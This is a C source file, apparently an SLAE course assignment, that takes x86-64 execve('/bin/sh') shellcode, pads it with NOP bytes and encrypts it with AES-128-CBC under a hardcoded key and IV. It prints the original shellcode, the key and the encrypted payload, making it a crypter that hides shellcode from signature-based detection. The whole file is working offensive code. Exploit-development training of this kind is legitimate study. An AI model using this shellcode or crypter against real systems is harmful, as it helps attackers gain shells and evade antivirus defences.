#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include "aes.h"

unsigned char shellcode[] = \
	"\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43";

unsigned char key[] = "slae_assignment7";

int main ()
{

  printf("Original Shellcode:\n");
	unsigned char byte;

        for (int counter=0; counter < strlen(shellcode); counter++)
        {
                byte = shellcode[counter];
                printf("\\x%02x", byte);
        }

	char nop[] = "\x90";

	while ((strlen(shellcode) % 16) != 0)
	{
		strcat(shellcode, nop);
	}

	size_t len = strlen(shellcode);
	char * fshellcode = (char *)malloc(len);
	memcpy(fshellcode, shellcode, len);

	unsigned char encrypted_byte, key_byte;

	uint8_t iv[]  = { 0xFC, 0xBA, 0x11, 0xEF, 0x99, 0x8C, 0x1A, 0xC7, 0xEE, 0xD9, 0x51, 0x64, 0x9D, 0xFA, 0x55, 0xAA };

	unsigned char* dst_buffer = malloc(strlen(fshellcode));

	AES128_CBC_encrypt_buffer(dst_buffer, fshellcode, strlen(fshellcode), key, iv);

	printf("\n\nAES encryption Key:\n");

	for (int counter=0; counter < 16; counter++)
	{
		key_byte = key[counter];
		printf("\\x%02x", key_byte);

	}

	printf("\n\n");
	printf("AES Encrypted Shellcode:\n");

	for (int counter=0; counter < strlen(fshellcode); counter++)
	{
		encrypted_byte = dst_buffer[counter];
		printf("\\x%02x", encrypted_byte);
	}

	printf("\n");
	free(dst_buffer);

	return 0;
}
